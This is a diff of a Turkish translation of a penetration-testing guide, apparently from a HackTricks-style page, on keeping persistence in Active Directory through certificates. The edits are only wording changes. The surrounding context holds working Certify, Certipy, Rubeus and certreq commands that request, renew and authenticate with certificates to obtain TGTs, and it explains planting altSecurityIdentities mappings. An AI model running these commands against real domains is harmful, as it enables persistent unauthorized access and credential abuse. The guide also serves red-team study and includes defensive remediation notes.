@@ -6,7 +6,7 @@
 
 ## Sertifikalar ile Aktif Kullanıcı Kimlik Bilgisi Hırsızlığını Anlamak – PERSIST1
 
-Bir kullanıcının alan kimlik doğrulamasına izin veren bir sertifika talep edebileceği bir senaryoda, bir saldırganın bu sertifikayı talep etme ve çalma fırsatı vardır, böylece bir ağda sürekliliği sürdürebilir. Varsayılan olarak, Active Directory'deki `User` şablonu bu tür taleplere izin verir, ancak bazen devre dışı bırakılabilir.
+Bir kullanıcının alan kimlik doğrulamasına izin veren bir sertifika talep edebileceği bir senaryoda, bir saldırgan bu sertifikayı talep etme ve çalma fırsatına sahip olur, böylece bir ağda sürekliliği sürdürebilir. Varsayılan olarak, Active Directory'deki `User` şablonu bu tür taleplere izin verir, ancak bazen devre dışı bırakılabilir.
 
 [Certify](https://github.com/GhostPack/Certify) veya [Certipy](https://github.com/ly4k/Certipy) kullanarak, istemci kimlik doğrulamasına izin veren etkin şablonları arayabilir ve ardından birini talep edebilirsiniz:
 ```bash
@@ -19,7 +19,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:User
 # Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
 certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
 ```
-Bir sertifikanın gücü, sertifikanın ait olduğu kullanıcı olarak kimlik doğrulama yeteneğinde yatar; şifre değişikliklerinden bağımsız olarak, sertifika geçerli kaldığı sürece.
+Bir sertifikanın gücü, sertifikanın ait olduğu kullanıcı olarak kimlik doğrulama yeteneğinde yatar; şifre değişikliklerinden bağımsız olarak, sertifika geçerli olduğu sürece.
 
 PEM'i PFX'e dönüştürebilir ve bunu bir TGT elde etmek için kullanabilirsiniz:
 ```bash
@@ -32,7 +32,7 @@ Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /
 # Or with Certipy
 certipy auth -pfx user.pfx -dc-ip 10.0.0.10
 ```
-> Not: Diğer tekniklerle birleştirildiğinde (bkz. THEFT bölümleri), sertifika tabanlı kimlik doğrulama, LSASS'e dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.
+> Not: Diğer tekniklerle birleştirildiğinde (bkz. HIRSIZLIK bölümleri), sertifika tabanlı kimlik doğrulama, LSASS'e dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.
 
 ## Sertifikalar ile Makine Kalıcılığı Elde Etme - PERSIST2
 
@@ -46,7 +46,7 @@ Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0
 ```
 ## Sürekliliği Sertifika Yenileme ile Uzatma - PERSIST3
 
-Sertifika şablonlarının geçerlilik ve yenileme sürelerinden faydalanmak, bir saldırganın uzun vadeli erişim sağlamasına olanak tanır. Daha önce verilmiş bir sertifikaya ve onun özel anahtarına sahipseniz, süresi dolmadan önce yenileyerek, orijinal ilkeden bağlı ek talep kalıntıları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
+Sertifika şablonlarının geçerlilik ve yenileme sürelerinden faydalanmak, bir saldırganın uzun vadeli erişim sağlamasına olanak tanır. Daha önce verilmiş bir sertifikaya ve onun özel anahtarına sahipseniz, süresi dolmadan önce yenileyerek, orijinal ilk ile bağlantılı ek talep kalıntıları bırakmadan taze, uzun ömürlü bir kimlik bilgisi elde edebilirsiniz.
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
 # Provide the existing PFX and target the same CA/template when possible
@@ -57,7 +57,7 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 # (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
-> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikaların modern SID eşleme uzantısını içermesine neden olabilir ve bu da onları daha katı DC eşleme kuralları altında kullanılabilir kılar (bkz. sonraki bölüm).
+> Operasyonel ipucu: Saldırganın elindeki PFX dosyalarının ömürlerini takip edin ve erken yenileyin. Yenileme, güncellenmiş sertifikaların modern SID eşleme uzantısını içermesine neden olabilir, bu da onları daha katı DC eşleme kuralları altında kullanılabilir kılar (bkz. sonraki bölüm).
 
 ## Açık Sertifika Eşlemeleri Yerleştirme (altSecurityIdentities) – PERSIST4
 
@@ -85,10 +85,10 @@ Sonra PFX'inizle kimlik doğrulaması yapın. Certipy doğrudan bir TGT alacakt�
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 ```
 Notlar
-- Sadece güçlü eşleme türlerini kullanın: X509IssuerSerialNumber, X509SKI veya X509SHA1PublicKey. Zayıf formatlar (Subject/Issuer, sadece Subject, RFC822 e-posta) kullanımdan kaldırılmıştır ve DC politikası tarafından engellenebilir.
+- Sadece güçlü eşleme türlerini kullanın: X509IssuerSerialNumber, X509SKI veya X509SHA1PublicKey. Zayıf formatlar (Subject/Issuer, Subject-only, RFC822 e-posta) kullanımdan kaldırılmıştır ve DC politikası tarafından engellenebilir.
 - Sertifika zinciri, DC tarafından güvenilen bir kök sertifikaya ulaşmalıdır. NTAuth'taki Kurumsal CA'lar genellikle güvenilir; bazı ortamlar ayrıca kamu CA'larını da güvenilir kabul eder.
 
-Zayıf açık eşlemeler ve saldırı yolları hakkında daha fazla bilgi için, bakınız:
+Zayıf açık eşlemeler ve saldırı yolları hakkında daha fazla bilgi için, bkz:
 
 {{#ref}}
 domain-escalation.md
@@ -111,11 +111,11 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 ```
 Ajans sertifikasının veya şablon izinlerinin iptali, bu kalıcılığı ortadan kaldırmak için gereklidir.
 
-## 2025 Güçlü Sertifika Eşleştirme Uygulaması: Kalıcılık Üzerindeki Etkisi
+## 2025 Güçlü Sertifika Eşleştirme Uygulaması: Kalıcılığa Etkisi
 
 Microsoft KB5014754, etki alanı denetleyicilerinde Güçlü Sertifika Eşleştirme Uygulamasını tanıttı. 11 Şubat 2025'ten itibaren, DC'ler varsayılan olarak Tam Uygulama moduna geçerek zayıf/belirsiz eşleştirmeleri reddetmektedir. Pratik sonuçlar:
 
-- SID eşleştirme uzantısını içermeyen 2022 öncesi sertifikalar, DC'ler Tam Uygulama modundayken örtük eşleştirmeyi başarısız kılabilir. Saldırganlar, sertifikaları AD CS aracılığıyla yenileyerek (SID uzantısını elde etmek için) veya `altSecurityIdentities` içinde güçlü bir açık eşleştirme yerleştirerek (PERSIST4) erişimi sürdürebilir.
+- SID eşleştirme uzantısını içermeyen 2022 öncesi sertifikalar, DC'ler Tam Uygulama modundayken örtük eşleştirmeyi başarısızlıkla sonuçlandırabilir. Saldırganlar, sertifikaları AD CS aracılığıyla yenileyerek (SID uzantısını almak için) veya `altSecurityIdentities` içinde güçlü bir açık eşleştirme yerleştirerek (PERSIST4) erişimi sürdürebilir.
 - Güçlü formatlar (Yayımcı+Seri, SKI, SHA1-PublicKey) kullanan açık eşleştirmeler çalışmaya devam etmektedir. Zayıf formatlar (Yayımcı/Konu, Sadece-Konu, RFC822) engellenebilir ve kalıcılık için kaçınılmalıdır.
 
 Yönetici, aşağıdakileri izlemeli ve uyarı vermelidir:
